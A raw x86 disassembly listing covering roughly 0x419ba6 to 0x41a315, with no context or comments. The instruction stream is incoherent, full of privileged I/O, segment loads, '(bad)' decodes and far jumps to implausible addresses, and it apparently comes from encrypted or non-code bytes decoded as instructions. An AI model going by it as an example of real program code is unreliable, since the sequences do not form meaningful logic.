  419ba6:	in     al,dx
  419ba7:	js     0x419bc7
  419ba9:	loopne 0x419bd9
  419bab:	call   0x34d06efe
  419bb0:	push   ds
  419bb1:	and    eax,0x2c33b702
  419bb6:	mov    edi,0x4b7f7fa5
  419bbb:	bound  ebx,QWORD PTR [ebp-0x7d]
  419bbe:	xor    edi,DWORD PTR ds:0xed3b4aa4
  419bc4:	cmp    BYTE PTR [edi+ecx*2-0x23],dh
  419bc8:	mov    edx,0xe6f9510b
  419bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bce:	adc    ah,ch
  419bd0:	mov    fs,WORD PTR [edx-0x58]
  419bd3:	rep ins BYTE PTR es:[edi],dx
  419bd5:	mov    cl,0xf2
  419bd7:	sbb    ebx,DWORD PTR [esi+0x7d]
  419bda:	imul   edx,DWORD PTR [ebx-0x39],0x32
  419bde:	jns    0x419bd1
  419be0:	lock xchg BYTE PTR [esi+0x10],bl
  419be4:	xor    esp,DWORD PTR [ebx+0x64d6b491]
  419bea:	mov    ebp,0x4c104681
  419bef:	lods   al,BYTE PTR ds:[esi]
  419bf0:	xor    al,0x1b
  419bf2:	cdq    
  419bf3:	dec    edx
  419bf4:	jnp    0x419c24
  419bf6:	dec    eax
  419bf7:	call   0x88e47f08
  419bfc:	scas   al,BYTE PTR es:[edi]
  419bfd:	jne    0x419c63
  419bff:	jl     0x419bb9
  419c01:	jae    0x419c53
  419c03:	test   eax,0xf1c3dc25
  419c08:	out    dx,eax
  419c09:	push   eax
  419c0a:	test   dl,cl
  419c0c:	pop    esp
  419c0d:	shr    DWORD PTR [esi],cl
  419c0f:	test   BYTE PTR [ecx-0x6a8b3dfb],ah
  419c15:	mov    ds:0x6d610aee,al
  419c1a:	popf   
  419c1b:	cmp    ch,BYTE PTR [esi-0x4c7bda5e]
  419c21:	adc    al,0x55
  419c23:	loope  0x419bd9
  419c25:	cmp    eax,ebp
  419c27:	lock mov ebx,0x3e868a7f
  419c2d:	jmp    0x7eb94c80
  419c32:	or     ah,BYTE PTR [esi-0x3f]
  419c35:	pop    ebx
  419c36:	shl    DWORD PTR [ebx+0x48],1
  419c39:	cmp    eax,0x3ac0bcfc
  419c3e:	xchg   BYTE PTR [eax+0x103dcd28],dh
  419c44:	adc    al,0x7c
  419c46:	pop    ebp
  419c47:	push   0xffffffff
  419c49:	adc    dh,BYTE PTR [edi+0x27]
  419c4c:	les    eax,FWORD PTR [ebx-0x16bff170]
  419c52:	add    DWORD PTR [ebx+eiz*1],ecx
  419c55:	and    BYTE PTR [ebx-0x3d36cad3],cl
  419c5b:	sub    BYTE PTR [ebx+edi*2],dh
  419c5e:	mov    bh,0x48
  419c60:	lods   eax,DWORD PTR ds:[esi]
  419c61:	push   edi
  419c62:	ja     0x419bf0
  419c64:	inc    esi
  419c65:	les    edi,FWORD PTR fs:[ecx+0x59]
  419c69:	sbb    BYTE PTR [edx],ch
  419c6b:	push   edi
  419c6c:	mov    ah,0x9
  419c6e:	mov    ds:0x32f86fad,al
  419c73:	pop    ebx
  419c74:	sti    
  419c75:	les    eax,FWORD PTR [edi-0x462bca82]
  419c7b:	or     DWORD PTR [edi+edi*8],edx
  419c7e:	xchg   DWORD PTR [ecx+0x62],esp
  419c81:	pop    esp
  419c82:	clc    
  419c83:	mov    WORD PTR [eax],gs
  419c85:	imul   edx,DWORD PTR [edx-0x20],0x57cfe95b
  419c8c:	and    edx,DWORD PTR [eax-0x40]
  419c8f:	enter  0xfec3,0x16
  419c93:	push   0x25
  419c95:	sub    ebp,edx
  419c97:	jge    0x419c2d
  419c99:	outs   dx,BYTE PTR ds:[esi]
  419c9a:	iret   
  419c9b:	dec    eax
  419c9c:	lods   al,BYTE PTR ds:[esi]
  419c9d:	mov    cl,ah
  419c9f:	test   DWORD PTR [ebp+0x35daea53],edx
  419ca5:	in     al,dx
  419ca6:	pusha  
  419ca7:	sbb    BYTE PTR [edi],cl
  419ca9:	mov    ebx,0x7da98b7a
  419cae:	mov    al,ds:0x7b57385c
  419cb3:	sbb    eax,0x8e962280
  419cb8:	cmc    
  419cb9:	or     esi,DWORD PTR [edi-0x6a]
  419cbc:	fwait
  419cbd:	pop    ss
  419cbe:	popa   
  419cbf:	sbb    ah,BYTE PTR [ecx+ebx*4]
  419cc2:	lods   al,BYTE PTR ds:[esi]
  419cc3:	mov    ?,ebx
  419cc5:	int3   
  419cc6:	pop    ebx
  419cc7:	sub    esi,edi
  419cc9:	stos   DWORD PTR es:[edi],eax
  419cca:	mov    ebx,0xfb9b3742
  419ccf:	outs   dx,DWORD PTR ds:[esi]
  419cd0:	or     al,0x22
  419cd2:	das    
  419cd3:	fs jnp 0x419cee
  419cd6:	and    ebp,ecx
  419cd8:	xchg   edi,eax
  419cd9:	adc    BYTE PTR [ecx],ah
  419cdb:	retf   0xa297
  419cde:	mov    DWORD PTR [edx-0x1506f6ed],eax
  419ce4:	aas    
  419ce5:	push   es
  419ce6:	into   
  419ce7:	cwde   
  419ce8:	loopne 0x419ccc
  419cea:	aaa    
  419ceb:	or     DWORD PTR ds:0x862a603e,esi
  419cf1:	psubusw mm5,QWORD PTR [ebp+0x40]
  419cf5:	jnp    0x419c98
  419cf7:	mov    BYTE PTR [ebp+0x9],0x70
  419cfb:	stos   DWORD PTR es:[edi],eax
  419cfc:	icebp  
  419cfd:	imul   esp,DWORD PTR [edi+edi*4+0x10],0x5638f0d7
  419d05:	xor    eax,0xf5036c89
  419d0a:	push   esp
  419d0b:	mov    bh,0x18
  419d0d:	and    DWORD PTR [ebp-0x2c],esi
  419d10:	mov    al,0x8d
  419d12:	inc    ecx
  419d13:	push   esi
  419d14:	lds    edx,FWORD PTR [ecx-0x6985bc05]
  419d1a:	sbb    DWORD PTR [eax+0x66],edx
  419d1d:	nop
  419d1e:	cmc    
  419d1f:	mov    BYTE PTR [eax],ah
  419d21:	(bad)  
  419d22:	mov    esi,0x971681c6
  419d27:	mov    BYTE PTR [ecx],al
  419d29:	sbb    edi,ebx
  419d2b:	daa    
  419d2c:	or     DWORD PTR [esi],0x84b40540
  419d32:	inc    esi
  419d33:	pop    edx
  419d34:	mov    DWORD PTR [edx+0x7d],ebp
  419d37:	je     0x419d3c
  419d39:	iret   
  419d3a:	fwait
  419d3b:	cli    
  419d3c:	shl    eax,cl
  419d3e:	sbb    esp,DWORD PTR [esi-0x12]
  419d41:	(bad)  
  419d42:	ret    
  419d43:	jp     0x419cde
  419d45:	adc    eax,0xcc097294
  419d4a:	add    al,0xdf
  419d4c:	ins    BYTE PTR es:[edi],dx
  419d4d:	add    al,0x81
  419d4f:	dec    ecx
  419d50:	mov    bl,0xee
  419d52:	lahf   
  419d53:	sahf   
  419d54:	out    0xb9,al
  419d56:	jle    0x419d7b
  419d58:	or     al,0xe8
  419d5a:	inc    ecx
  419d5b:	loope  0x419db1
  419d5d:	or     al,0x24
  419d5f:	jo     0x419ddf
  419d61:	pop    ebp
  419d62:	sub    DWORD PTR [ebp+0x7a],0xff20b8fd
  419d69:	fdivrp st(7),st
  419d6b:	mov    ah,0x2d
  419d6d:	outs   dx,DWORD PTR ds:[esi]
  419d6e:	sbb    eax,0xb9bc1685
  419d73:	pop    ebp
  419d74:	mov    WORD PTR [esi],ss
  419d76:	jno    0x419d55
  419d78:	js     0x419d7c
  419d7a:	sahf   
  419d7b:	adc    BYTE PTR [esp+eax*8+0x4c2bdd01],cl
  419d82:	jl     0x419d95
  419d84:	hlt    
  419d85:	add    BYTE PTR [ebp+0x32],0xac
  419d89:	pushf  
  419d8a:	pop    ss
  419d8b:	es stc 
  419d8d:	pop    ebx
  419d8e:	data16 sbb dh,BYTE PTR [ecx]
  419d91:	mov    al,ds:0x76726415
  419d96:	dec    edi
  419d97:	add    DWORD PTR [eax-0x27279685],eax
  419d9d:	dec    esp
  419d9e:	xor    DWORD PTR [ebp-0x32061226],esi
  419da4:	mov    cl,0xa9
  419da6:	je     0x419d8f
  419da8:	xor    DWORD PTR [ecx-0x356e0be7],ebx
  419dae:	je     0x419dc9
  419db0:	(bad)  
  419db1:	(bad)  
  419db2:	fdivp  st(4),st
  419db4:	sti    
  419db5:	sub    BYTE PTR [edi-0x3f],ch
  419db8:	cmp    BYTE PTR [esi-0x43],ah
  419dbb:	shr    edi,cl
  419dbd:	(bad)  
  419dbe:	fst    QWORD PTR [esi+0x28]
  419dc1:	icebp  
  419dc2:	mov    ebp,0x1a2b2c0c
  419dc7:	es fwait
  419dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dca:	mov    BYTE PTR [ecx-0x13],dh
  419dcd:	mov    edi,0x780177b4
  419dd2:	push   ebp
  419dd3:	xor    edx,0x3d89e9fb
  419dd9:	and    al,0x32
  419ddb:	cmp    al,BYTE PTR [edi-0x4cc25e23]
  419de1:	mov    ebx,0x144254b5
  419de6:	pop    esi
  419de7:	or     edi,esp
  419de9:	repz dec esp
  419deb:	add    eax,0xd5e2ddb1
  419df0:	call   DWORD PTR [esi-0x5c59b933]
  419df6:	inc    edx
  419df7:	sub    al,0xe8
  419df9:	xlat   BYTE PTR ds:[ebx]
  419dfa:	or     al,0xe3
  419dfc:	cmp    eax,0xdb49bfec
  419e01:	fadd   QWORD PTR [ebx-0x68]
  419e04:	mov    ebx,0xa96592fe
  419e09:	inc    edi
  419e0a:	loop   0x419e0d
  419e0c:	dec    esp
  419e0d:	cli    
  419e0e:	sub    ecx,ebx
  419e10:	mov    ss,esi
  419e12:	sub    DWORD PTR [eax+0x24e865a],ecx
  419e18:	nop
  419e19:	shr    cl,cl
  419e1b:	std    
  419e1c:	(bad)  
  419e1d:	pop    ds
  419e1e:	push   es
  419e1f:	or     cl,BYTE PTR [ebx]
  419e21:	mov    ah,0x30
  419e23:	dec    ebx
  419e24:	cdq    
  419e25:	je     0x419ea5
  419e27:	jg     0x419de0
  419e29:	sti    
  419e2a:	iret   
  419e2b:	test   DWORD PTR [ecx],esp
  419e2d:	mov    esp,0xd41fec73
  419e32:	das    
  419e33:	jg     0x419e73
  419e35:	cmc    
  419e36:	add    al,0xf6
  419e38:	push   ebx
  419e39:	mov    dl,0xf9
  419e3b:	out    0xd2,eax
  419e3d:	fcmovnb st,st(2)
  419e3f:	lds    edx,FWORD PTR ds:0x3b85b2c9
  419e45:	mov    ecx,0x885e42af
  419e4a:	shr    BYTE PTR [ebx],cl
  419e4c:	in     al,dx
  419e4d:	test   DWORD PTR [edi],ebp
  419e4f:	cdq    
  419e50:	xor    esp,DWORD PTR es:[ecx+0x45]
  419e54:	mov    dh,0x2d
  419e56:	ja     0x419df6
  419e58:	enter  0x6c7a,0xd1
  419e5c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419e5e:	lods   eax,DWORD PTR ds:[esi]
  419e5f:	cmp    dh,ah
  419e61:	retf   0x8c2e
  419e64:	or     al,BYTE PTR ds:0x85ae6f90
  419e6a:	mov    esp,0x72c2fe3e
  419e6f:	push   eax
  419e70:	lods   al,BYTE PTR ds:[esi]
  419e71:	scas   eax,DWORD PTR es:[edi]
  419e72:	and    eax,0x3da718c9
  419e77:	pop    esi
  419e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e79:	mov    BYTE PTR [edx-0x893410],ah
  419e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e80:	and    BYTE PTR [ebp+0x19f3d6fa],ch
  419e86:	push   cs
  419e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e88:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419e8a:	sub    DWORD PTR [ecx-0xa69fff3],eax
  419e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e91:	enter  0x79d8,0xf7
  419e95:	xchg   DWORD PTR [esi-0x63],esp
  419e98:	neg    DWORD PTR [eax-0x25]
  419e9b:	cdq    
  419e9c:	sub    DWORD PTR [esi+0x2debfee0],ebx
  419ea2:	sbb    DWORD PTR [esi-0x500dca89],esi
  419ea8:	xchg   edi,eax
  419ea9:	push   0xf013bc49
  419eae:	fucomip st,st(5)
  419eb0:	mov    ebx,0x61bc9026
  419eb5:	xor    eax,0x2f6b0c4
  419eba:	inc    edx
  419ebb:	inc    ebp
  419ebc:	xor    bl,cl
  419ebe:	jb     0x419f1d
  419ec0:	(bad)  
  419ec1:	shl    DWORD PTR [edi],cl
  419ec3:	test   DWORD PTR [ecx+ebx*1],0x8ec8b40a
  419eca:	out    0x20,eax
  419ecc:	loop   0x419e8b
  419ece:	mov    cl,0x9b
  419ed0:	adc    al,0xab
  419ed2:	mov    esi,0xa9e3f73f
  419ed7:	test   DWORD PTR [eax],edi
  419ed9:	add    eax,0x9eaaec3c
  419ede:	test   al,0x6f
  419ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee1:	lock inc edi
  419ee3:	imul   esp,DWORD PTR [ebx+ecx*8-0x59],0x4
  419ee8:	loop   0x419eca
  419eea:	sbb    ah,BYTE PTR [ecx]
  419eec:	fnstcw WORD PTR [esi+0x65a5678c]
  419ef2:	ror    BYTE PTR [eax+0x12],1
  419ef5:	and    BYTE PTR ds:0x38b36627,al
  419efb:	pop    ss
  419efc:	gs xchg esp,eax
  419efe:	cli    
  419eff:	and    ebp,DWORD PTR [edx-0x5b]
  419f02:	into   
  419f03:	adc    DWORD PTR [ebp-0x25f9cc5d],esi
  419f09:	leave  
  419f0a:	mov    DWORD PTR [ebx+ecx*8+0x579edb43],eax
  419f11:	pop    ds
  419f12:	loope  0x419f0c
  419f14:	arpl   WORD PTR [esi+0x4d],bp
  419f17:	loope  0x419ec7
  419f19:	outs   dx,BYTE PTR ds:[esi]
  419f1a:	fdivr  st,st(2)
  419f1c:	mov    ds,WORD PTR [esi-0x53]
  419f1f:	call   0xc3b2df0
  419f24:	pop    edi
  419f25:	cdq    
  419f26:	inc    ebp
  419f27:	mov    edi,0x39fc957b
  419f2c:	hlt    
  419f2d:	repz in al,dx
  419f2f:	ja     0x419f01
  419f31:	xchg   esp,eax
  419f32:	out    dx,eax
  419f33:	rcr    DWORD PTR [ecx-0x64],0x31
  419f37:	stos   BYTE PTR es:[edi],al
  419f38:	and    eax,0x8e6e12da
  419f3d:	ss or  bh,cl
  419f40:	dec    eax
  419f41:	and    al,0x4
  419f43:	jbe    0x419f94
  419f45:	sahf   
  419f46:	unpckhps xmm4,XMMWORD PTR [esp+ebx*2]
  419f4a:	add    BYTE PTR [edx-0x42],al
  419f4d:	cmp    eax,0x21411c15
  419f52:	adc    ch,BYTE PTR [edx-0x4b]
  419f55:	popa   
  419f56:	fcom   QWORD PTR [ebp+0x39686e87]
  419f5c:	adc    DWORD PTR [esi-0x42763411],edi
  419f62:	mov    ds:0x14f5dc80,eax
  419f67:	jne    0x419f7d
  419f69:	leave  
  419f6a:	shl    dl,cl
  419f6c:	xchg   BYTE PTR [esi],ch
  419f6e:	and    ebp,DWORD PTR [esp+edi*4+0x38b315b8]
  419f75:	mov    cl,bh
  419f77:	add    al,0x4d
  419f79:	mov    ds:0xef7d43fd,al
  419f7e:	rep ins DWORD PTR es:[edi],dx
  419f80:	and    cl,BYTE PTR [ebx]
  419f82:	fcmovu st,st(5)
  419f84:	cmp    DWORD PTR [edi-0x28d823fd],0x34
  419f8b:	jle    0x419f30
  419f8d:	shr    BYTE PTR ds:0xb63f85d9,0x67
  419f94:	ins    BYTE PTR es:[edi],dx
  419f95:	xchg   BYTE PTR [edi-0x6200ca34],bl
  419f9b:	or     al,0xa8
  419f9d:	inc    ecx
  419f9e:	fcomip st,st(1)
  419fa0:	daa    
  419fa1:	cmp    eax,ecx
  419fa3:	cli    
  419fa4:	mov    bh,dh
  419fa6:	add    ah,BYTE PTR [ebp+0x48]
  419fa9:	adc    al,0xfd
  419fab:	sbb    DWORD PTR [eax],ebx
  419fad:	dec    esi
  419fae:	lea    ecx,[edx]
  419fb0:	xlat   BYTE PTR ds:[ebx]
  419fb1:	sbb    edi,DWORD PTR [eax+0x0]
  419fb4:	aaa    
  419fb5:	fwait
  419fb6:	dec    ecx
  419fb7:	dec    ebp
  419fb8:	fdiv   QWORD PTR [esi-0x1666c16]
  419fbe:	xor    ecx,DWORD PTR [ecx+0x7e812f77]
  419fc4:	xchg   ecx,edi
  419fc6:	lock xchg edi,eax
  419fc8:	or     BYTE PTR [edi+eax*4-0x4cd53a82],dl
  419fcf:	std    
  419fd0:	add    al,BYTE PTR [edx+edi*2-0x5513532e]
  419fd7:	fbld   TBYTE PTR [edi-0x7]
  419fda:	or     DWORD PTR gs:[edi-0x16429307],esp
  419fe1:	xchg   ebx,eax
  419fe2:	imul   ebx,eax,0xae274738
  419fe8:	outs   dx,DWORD PTR ds:[esi]
  419fe9:	add    al,0x95
  419feb:	push   esp
  419fec:	xchg   esp,eax
  419fed:	fnstsw ax
  419fef:	xchg   ecx,eax
  419ff0:	push   edi
  419ff1:	clc    
  419ff2:	push   edx
  419ff3:	outs   dx,BYTE PTR ds:[esi]
  419ff4:	push   ebx
  419ff5:	inc    edi
  419ff6:	cmp    eax,0x163b4679
  419ffb:	jns    0x41a066
  419ffd:	scas   eax,DWORD PTR es:[edi]
  419ffe:	mov    cl,0xf1
  41a000:	hlt    
  41a001:	sub    BYTE PTR [esi+0x78607f9e],dh
  41a007:	mov    edx,0xe20c30b9
  41a00c:	mov    eax,ds:0x611dd05b
  41a011:	push   esi
  41a012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a013:	xchg   esi,eax
  41a014:	mov    ecx,0xf7d29741
  41a019:	repz xchg ebx,eax
  41a01b:	sbb    al,0x4f
  41a01d:	and    DWORD PTR [edx-0x34],edx
  41a020:	daa    
  41a021:	push   edx
  41a022:	dec    ebp
  41a023:	idiv   DWORD PTR [ecx]
  41a025:	push   ds
  41a026:	cld    
  41a027:	addr16 jae 0x41a01b
  41a02a:	in     eax,0xbf
  41a02c:	dec    edi
  41a02d:	out    0xc5,eax
  41a02f:	ret    0x8e24
  41a032:	jns    0x41a050
  41a034:	int3   
  41a035:	stos   DWORD PTR es:[edi],eax
  41a036:	daa    
  41a037:	inc    esi
  41a038:	lods   eax,DWORD PTR ds:[esi]
  41a039:	pop    es
  41a03a:	cdq    
  41a03b:	dec    ebp
  41a03c:	out    0xc9,eax
  41a03e:	scas   al,BYTE PTR es:[edi]
  41a03f:	inc    ebp
  41a040:	shr    DWORD PTR [ebx+0x38],0xda
  41a044:	test   ebx,0xb9dec868
  41a04a:	shl    DWORD PTR [edx],0xf1
  41a04d:	pop    esi
  41a04e:	arpl   WORD PTR [edi],di
  41a050:	pop    ds
  41a051:	xor    bl,cl
  41a053:	adc    BYTE PTR [eax],dl
  41a055:	sub    eax,0x1c4f603b
  41a05a:	cdq    
  41a05b:	mov    bh,0x47
  41a05d:	pop    ebp
  41a05e:	mov    ecx,0xbbc617ed
  41a063:	inc    esi
  41a064:	sub    bl,dh
  41a066:	and    BYTE PTR [ebx],bh
  41a068:	mov    eax,0x70f57215
  41a06d:	mov    ebp,0x5db0b0f2
  41a072:	loope  0x41a03b
  41a074:	mov    ah,0x7f
  41a076:	xchg   edx,eax
  41a077:	dec    edi
  41a078:	jo     0x41a0f2
  41a07a:	pop    ds
  41a07b:	sti    
  41a07c:	(bad)  
  41a07e:	pop    ebx
  41a07f:	sbb    esp,ebp
  41a081:	jecxz  0x41a0dd
  41a083:	jge    0x41a044
  41a085:	out    0x6c,al
  41a087:	lock mov al,ds:0x8fca79e8
  41a08d:	fwait
  41a08e:	imul   edi,DWORD PTR [esi],0x1
  41a091:	mov    ch,0x83
  41a093:	xchg   ebx,eax
  41a094:	xor    BYTE PTR [ebx+0x7452de04],0x69
  41a09b:	test   eax,0x1ad9cc77
  41a0a0:	adc    al,0x16
  41a0a2:	pop    ds
  41a0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0a4:	retf   
  41a0a5:	cli    
  41a0a6:	bound  eax,QWORD PTR [edx]
  41a0a8:	dec    esi
  41a0a9:	test   BYTE PTR [edx],0x50
  41a0ac:	xlat   BYTE PTR ds:[ebx]
  41a0ad:	in     al,0xbf
  41a0af:	cmp    BYTE PTR [edi+edi*4],al
  41a0b2:	jbe    0x41a0a2
  41a0b4:	ja     0x41a0f8
  41a0b6:	in     eax,dx
  41a0b7:	ins    DWORD PTR es:[edi],dx
  41a0b8:	fnstsw WORD PTR [ecx-0x6378191f]
  41a0be:	add    ecx,DWORD PTR fs:[eax-0x3adae6de]
  41a0c5:	xchg   edi,eax
  41a0c6:	ror    BYTE PTR [ebp+0x63028e40],1
  41a0cc:	sti    
  41a0cd:	mov    ch,BYTE PTR [edx]
  41a0cf:	dec    ebp
  41a0d0:	out    0x31,al
  41a0d2:	sbb    eax,0xf22525e1
  41a0d7:	jmp    0x6eb58175
  41a0dc:	stos   BYTE PTR es:[edi],al
  41a0dd:	add    ebx,0xffffffa2
  41a0e0:	jge    0x41a0ef
  41a0e2:	shl    ch,1
  41a0e4:	mov    WORD PTR [edi-0x54],es
  41a0e7:	push   esi
  41a0e8:	jp     0x41a11a
  41a0ea:	pop    es
  41a0eb:	push   0x1e
  41a0ed:	cmp    ah,BYTE PTR [esi+0x6ce46f09]
  41a0f3:	mov    bl,0x9f
  41a0f5:	push   ds
  41a0f6:	cmc    
  41a0f7:	rcl    DWORD PTR [edx+0x1db5641d],1
  41a0fd:	or     eax,0xca5d1b75
  41a102:	xchg   ecx,eax
  41a103:	(bad)  
  41a104:	pop    ebx
  41a105:	jmp    0x2ed2:0x3109775f
  41a10c:	(bad)  
  41a10d:	jae    0x41a161
  41a10f:	xchg   edi,eax
  41a110:	push   ss
  41a111:	fsub   QWORD PTR [edi]
  41a113:	lods   eax,DWORD PTR ds:[esi]
  41a114:	mov    ds:0x6fee051d,al
  41a119:	add    DWORD PTR [ebp-0x6a],edi
  41a11c:	pop    eax
  41a11d:	in     al,dx
  41a11e:	adc    al,0x5
  41a120:	adc    eax,0x69cdaac3
  41a125:	fld    QWORD PTR [esi+edx*2-0xc1728f1]
  41a12c:	cmp    edi,edx
  41a12e:	inc    eax
  41a12f:	out    dx,al
  41a130:	ins    DWORD PTR es:[edi],dx
  41a131:	out    0xdc,eax
  41a133:	inc    esp
  41a134:	sub    BYTE PTR [ecx-0x53],0x7f
  41a138:	xchg   ecx,eax
  41a139:	mov    ebp,0x41f77db1
  41a13e:	mov    ebx,0xf56a064c
  41a143:	cwde   
  41a144:	lahf   
  41a145:	push   0xf133890a
  41a14a:	loop   0x41a152
  41a14c:	pop    ecx
  41a14d:	push   esi
  41a14e:	lea    edx,[ecx+0x6a]
  41a151:	xchg   edx,eax
  41a152:	es out 0xca,eax
  41a155:	jg     0x41a14b
  41a157:	pushf  
  41a158:	ficom  WORD PTR [ebp+0x46606e50]
  41a15e:	test   BYTE PTR [esi+0x63b1d7cc],al
  41a164:	bound  ebx,QWORD PTR [esi]
  41a166:	push   0x7e
  41a168:	in     eax,0xb3
  41a16a:	push   eax
  41a16b:	mov    eax,0x9021f148
  41a170:	push   eax
  41a171:	mov    dl,0x7f
  41a173:	cli    
  41a174:	mov    edi,cs
  41a176:	sbb    edi,ecx
  41a178:	mov    ebp,0xa27d9de1
  41a17d:	or     eax,0x73ff0f36
  41a182:	pop    eax
  41a183:	shl    DWORD PTR [eax],cl
  41a185:	sub    al,0x65
  41a187:	les    edx,FWORD PTR [esi-0xf]
  41a18a:	jl     0x41a205
  41a18c:	rcr    BYTE PTR [esp+edi*4-0x78],cl
  41a190:	xchg   esi,eax
  41a191:	pop    edi
  41a192:	div    DWORD PTR [ebx-0x6c]
  41a195:	fwait
  41a196:	push   edx
  41a197:	nop
  41a198:	retf   
  41a199:	call   0xf5e99166
  41a19e:	lahf   
  41a19f:	in     eax,0xd6
  41a1a1:	popa   
  41a1a2:	mov    bl,0x6f
  41a1a4:	cmp    esi,DWORD PTR [eax-0xd]
  41a1a7:	sbb    cl,BYTE PTR [esi+eiz*1+0x36483d29]
  41a1ae:	or     DWORD PTR [edx-0x7a75e1ee],esi
  41a1b4:	xor    al,0xd9
  41a1b6:	sar    DWORD PTR [ebx],1
  41a1b8:	jcxz   0x41a1c2
  41a1bb:	int3   
  41a1bc:	loopne 0x41a14f
  41a1be:	lahf   
  41a1bf:	dec    edi
  41a1c0:	aam    0x72
  41a1c2:	push   esp
  41a1c3:	mov    esi,0x71070d6c
  41a1c8:	mov    BYTE PTR [ebp+0x4c711e2],al
  41a1ce:	mov    dl,0x87
  41a1d0:	mov    ebp,0xdcc4260c
  41a1d5:	add    al,0x8d
  41a1d7:	adc    al,0x7b
  41a1d9:	or     al,0x99
  41a1db:	pop    edi
  41a1dc:	fcomip st,st(6)
  41a1de:	je     0x41a24d
  41a1e0:	push   edx
  41a1e1:	push   ebp
  41a1e2:	mov    cl,0xc4
  41a1e4:	cmc    
  41a1e5:	and    DWORD PTR [esi+0x4d],esi
  41a1e8:	call   0x457d:0xda40bca4
  41a1ef:	mov    ebp,edx
  41a1f1:	nop    DWORD PTR [edx+0x317b39b1]
  41a1f8:	push   ebx
  41a1f9:	je     0x41a1a0
  41a1fb:	ja     0x41a228
  41a1fd:	mov    dl,0x2f
  41a1ff:	(bad)  
  41a202:	mov    esp,0x1bca0d87
  41a207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a208:	ja     0x41a206
  41a20a:	stc    
  41a20b:	jp     0x41a1f9
  41a20d:	cmp    ebx,ecx
  41a20f:	imul   ebx,ecx,0x2e
  41a212:	mov    al,ds:0xe3a0be6d
  41a217:	jmp    0x2fdf989d
  41a21c:	dec    ecx
  41a21d:	dec    esi
  41a21e:	mov    eax,ds:0x62eda50
  41a223:	mov    bh,0xcc
  41a225:	mov    ss,edi
  41a227:	adc    al,0x5c
  41a229:	pop    ecx
  41a22a:	(bad)  
  41a22b:	fild   QWORD PTR [edx+0x3a]
  41a22e:	stos   DWORD PTR es:[edi],eax
  41a22f:	cmp    ah,BYTE PTR [edi]
  41a231:	inc    edi
  41a232:	int    0xc6
  41a234:	push   ecx
  41a235:	in     eax,0xc0
  41a237:	dec    ecx
  41a238:	push   esp
  41a239:	popf   
  41a23a:	mov    eax,0xe4d9ebcc
  41a23f:	or     DWORD PTR [ebp+0x56ecdd63],ebx
  41a245:	out    dx,al
  41a246:	sub    edx,DWORD PTR [esi+0x7348f4ff]
  41a24c:	out    0xdd,eax
  41a24e:	retf   0xcc00
  41a251:	or     esp,DWORD PTR [edx-0x61]
  41a254:	ret    0xe055
  41a257:	outs   dx,DWORD PTR ds:[esi]
  41a258:	adc    edx,eax
  41a25a:	ss jg  0x41a2ae
  41a25d:	adc    ebp,DWORD PTR [edx+ebp*8]
  41a260:	(bad)  
  41a261:	mov    DWORD PTR [edi],ebp
  41a263:	pop    esp
  41a264:	xor    ecx,eax
  41a266:	imul   BYTE PTR [ebx+0x755acbbb]
  41a26c:	mov    al,ds:0xab31d661
  41a271:	in     eax,0x80
  41a273:	pop    ss
  41a274:	pop    edx
  41a275:	in     eax,dx
  41a276:	add    bh,BYTE PTR [edi+0x11]
  41a279:	sti    
  41a27a:	sub    dh,dh
  41a27c:	std    
  41a27d:	adc    eax,0x23851b23
  41a282:	int3   
  41a283:	je     0x41a2ce
  41a285:	jbe    0x41a249
  41a287:	lods   eax,DWORD PTR ds:[esi]
  41a288:	push   eax
  41a289:	int    0x73
  41a28b:	in     al,0xf7
  41a28d:	push   edi
  41a28e:	xchg   DWORD PTR [ebx],esp
  41a290:	and    cl,BYTE PTR [ebx]
  41a292:	ins    DWORD PTR es:[edi],dx
  41a293:	sub    ch,BYTE PTR [edx-0x170cc7ee]
  41a299:	pop    edi
  41a29a:	jl     0x41a252
  41a29c:	out    dx,al
  41a29d:	or     ch,BYTE PTR [edx-0x6]
  41a2a0:	xchg   esi,eax
  41a2a1:	mov    ebx,ebx
  41a2a3:	popa   
  41a2a4:	outs   dx,BYTE PTR ds:[esi]
  41a2a5:	add    edi,esi
  41a2a7:	std    
  41a2a8:	jecxz  0x41a25a
  41a2aa:	leave  
  41a2ab:	and    eax,0x62db77f6
  41a2b0:	xor    BYTE PTR [ebx-0x3cacb86b],ch
  41a2b6:	js     0x41a31f
  41a2b8:	ret    0x49fa
  41a2bb:	xchg   ecx,eax
  41a2bc:	mov    eax,ecx
  41a2be:	sbb    dl,BYTE PTR [edi]
  41a2c0:	push   es
  41a2c1:	aam    0xd5
  41a2c3:	push   esp
  41a2c4:	hlt    
  41a2c5:	mov    esp,0x90062a8c
  41a2ca:	xchg   ebp,eax
  41a2cb:	push   ds
  41a2cc:	adc    esi,esp
  41a2ce:	sub    BYTE PTR [ebp+0x41],0xff
  41a2d2:	xchg   ecx,eax
  41a2d4:	mov    al,0xd2
  41a2d6:	push   ecx
  41a2d7:	pop    DWORD PTR es:[ecx-0x22960ab1]
  41a2de:	push   esi
  41a2df:	sbb    esp,DWORD PTR [eax-0x7a]
  41a2e2:	jge    0x41a33a
  41a2e4:	leave  
  41a2e5:	mov    eax,ds:0xe01a2a39
  41a2ea:	or     BYTE PTR [ebp+0x3fee2d92],ch
  41a2f0:	popf   
  41a2f1:	or     edx,DWORD PTR ds:0xdd1e0011
  41a2f7:	jle    0x41a362
  41a2f9:	sti    
  41a2fa:	retf   0x4a80
  41a2fd:	(bad)  
  41a2fe:	dec    ebp
  41a2ff:	cmp    eax,0x587ceb60
  41a304:	sbb    BYTE PTR [ecx-0x36],dh
  41a307:	test   al,0xa6
  41a309:	pop    eax
  41a30a:	stos   DWORD PTR es:[edi],eax
  41a30b:	jne    0x41a323
  41a30d:	es cmp al,cl
  41a310:	xor    eax,0xa74a19f6
  41a315:	sub    DWORD PTR [eax+0xfec3de1],ecx
